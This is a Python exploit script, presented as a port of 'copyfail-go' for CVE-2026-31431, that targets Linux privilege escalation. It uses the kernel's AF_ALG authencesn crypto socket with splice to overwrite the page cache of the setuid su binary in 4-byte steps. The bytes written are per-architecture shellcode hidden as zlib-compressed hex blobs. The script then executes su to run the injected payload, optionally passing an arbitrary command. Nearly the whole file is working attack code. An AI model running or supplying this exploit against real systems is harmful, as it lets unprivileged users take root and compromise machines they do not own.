#!/usr/bin/env python3
from __future__ import annotations

import argparse
import errno
import os
import platform
import shutil
import socket
import struct
import sys
import zlib
from typing import BinaryIO


AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
ALG_OP_DECRYPT = 0

ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"

PAYLOADS_ZLIB_HEX = {
    "amd64": "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c00111d10d3",
    "386": "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40b806c80461569098000383e101c3db1bae9e6d303c1090a1af5f9c91a19f9499d7f93820b8f361e7a10ddc4089db598c11671b0038b31858",
    "arm64": "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578",
    "arm": "789cab77f57163646464800126060d06102f84c181c10426c8c2c06ac2a0c000538550ed00c61d40128459e1b20b1e8b172c780c64bc9760e87fc42000642b2c78cc0d1503c93342d9fa499979fac5190c00aca71742",
}

EXEC_ARGV1_ZLIB_HEX = {
    "amd64": "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e02e5c1680601086578c0f0ff864c7e568fee1a1501c36f59d61133f9590dff67d944f0b3020082b00eaf",
    "386": "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40381fc80461569098000383e101c3db1bae9e6de88e51e1303c99c51d31f36c83e1ed2cc688b30d001bf41180",
    "arm64": "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd04ca5b029787e96cb8e421d47009c8bbf280dbe1272390cf04c42ba4216220f915dc103600d72b1509",
    "arm": "789cab77f57163646464800126060d06102f84c181c10426c8c2c06ac2a0c000538550ed00c60d40128459e1b20b1e8b172c780c64bce76098fb944100c85658f0981b2a06926784b201f6cc14c1",
}

KEY_HEX = "0800010000000010" + "0" * 64

def goarch() -> str:
    """Map platform.machine() to copyfail-go GOARCH names."""
    m = platform.machine().lower()
    if m in ("x86_64", "amd64"):
        return "amd64"
    if m in ("i386", "i686"):
        return "386"
    if m in ("aarch64", "arm64"):
        return "arm64"
    if m.startswith("arm"):
        return "arm"
    raise SystemExit(f"Unsupported architecture: {platform.machine()!r}")

def decompress_payload(zlib_bytes: bytes) -> bytes:
    return zlib.decompress(zlib_bytes)

def resolve_su() -> str:
    fallback = "/usr/bin/su"
    if os.path.isfile(fallback):
        return fallback
    p = shutil.which("su")
    if not p:
        sys.exit(f"su not found in PATH and not at {fallback}")
    return p

def backup_su_binary(src: str, dst: str) -> None:
    st = os.stat(src)
    shutil.copy2(src, dst)
    # copy2 preserves times; ensure mode bits match (setuid etc.)
    os.chmod(dst, st.st_mode & (0o7777))

def accept_alg_op(master: socket.socket) -> socket.socket:
    """
    AF_ALG accept must use NULL addr; CPython's accept() does that on Linux.
    If it fails, fall back to accept4(2) via libc.
    """
    try:
        op, _ = master.accept()
        return op
    except OSError:
        pass

    import ctypes

    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    # int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
    fd = master.fileno()
    newfd = libc.accept4(fd, None, None, 0)
    if newfd < 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err), "accept4")
    return socket.fromfd(newfd, AF_ALG, socket.SOCK_SEQPACKET)

def trigger_write4(f: BinaryIO, t: int, four: bytes) -> None:
    """One 4-byte page-cache write at logical offset t (matches Go c())."""
    if len(four) < 4:
        four = four.ljust(4, b"\x00")

    master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    master.bind(("aead", ALG_NAME))
    key_bytes = bytes.fromhex(KEY_HEX)
    master.setsockopt(SOL_ALG, ALG_SET_KEY, key_bytes)
    master.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, struct.pack("i", 4))

    op = accept_alg_op(master)
    try:
        iv = bytes([0x10]) + b"\x00" * 19
        ancdata = [
            (SOL_ALG, ALG_SET_OP, struct.pack("I", ALG_OP_DECRYPT)),
            (SOL_ALG, ALG_SET_IV, iv),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("I", 8)),
        ]
        msg = b"AAAA" + four[:4]
        op.sendmsg([msg], ancdata, socket.MSG_MORE)

        pr, pw = os.pipe()
        try:
            o = t + 4
            fd = f.fileno()
            # Pipe ends must use offset None (see os.splice docs); passing 0 for a
            # pipe side yields ESPIPE — matches unix.Splice(..., nil, ...) in copyfail-go.
            n = os.splice(fd, pw, o, 0, None, 0)
            if n != o:
                raise RuntimeError(f"splice file->pipe short: {n} != {o}")
            n2 = os.splice(pr, op.fileno(), n, None, None, 0)
            if n2 != n:
                raise RuntimeError(f"splice pipe->op short: {n2} != {n}")
        finally:
            os.close(pr)
            os.close(pw)

        to_read = max(8 + t, 64)
        try:
            op.recv(to_read)
        except OSError as e:
            if e.errno not in (errno.EBADMSG, errno.EINVAL):
                raise
    finally:
        op.close()
        master.close()

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Python port of copyfail-go (CVE-2026-31431). "
        "Overwrites the page cache of su and runs su."
    )
    p.add_argument(
        "--backup",
        default="",
        metavar="PATH",
        help="copy the su binary here before corrupting page cache",
    )
    p.add_argument(
        "--exec",
        dest="exec_cmd",
        default="",
        metavar="CMD",
        help="command to pass as argv to su (uses exec-argv1 shellcode); full path recommended",
    )
    return p.parse_args()

def main() -> int:
    if sys.platform != "linux":
        print("This program only runs on Linux.", file=sys.stderr)
        return 1
    if not hasattr(os, "splice"):
        print("Python/os.splice not available; need Python 3.10+ on Linux.", file=sys.stderr)
        return 1

    args = parse_args()
    arch = goarch()

    if args.exec_cmd:
        hex_blob = EXEC_ARGV1_ZLIB_HEX.get(arch)
        label = "-exec"
    else:
        hex_blob = PAYLOADS_ZLIB_HEX.get(arch)
        label = "default"
    if not hex_blob:
        print(f"Unsupported architecture for {label}: {arch}", file=sys.stderr)
        return 1

    payload = decompress_payload(bytes.fromhex(hex_blob))
    su_path = resolve_su()

    if args.backup:
        backup_su_binary(su_path, args.backup)
        print(f"Backed up {su_path} to {args.backup}", file=sys.stderr)

    f = open(su_path, "rb", buffering=0)
    try:
        print(f"Overwriting page cache of {su_path} with {len(payload)} bytes", file=sys.stderr)
        i = 0
        while i < len(payload):
            end = min(i + 4, len(payload))
            chunk = payload[i:end]
            trigger_write4(f, i, chunk)
            step = end - i
            if len(payload) < 10000:
                if i % 100 == 0:
                    print(f" ... wrote {i + step} bytes", file=sys.stderr)
            else:
                if i % 10000 == 0:
                    print(f" ... wrote {i + step} bytes", file=sys.stderr)
            i = end
        print(f" ... wrote {len(payload)} bytes", file=sys.stderr)
    finally:
        f.close()

    print("Executing payload", file=sys.stderr)
    if args.exec_cmd:
        os.execvp("su", ["su", args.exec_cmd])
    else:
        os.execvp("su", ["su"])
    return 0

if __name__ == "__main__":
    sys.exit(main())
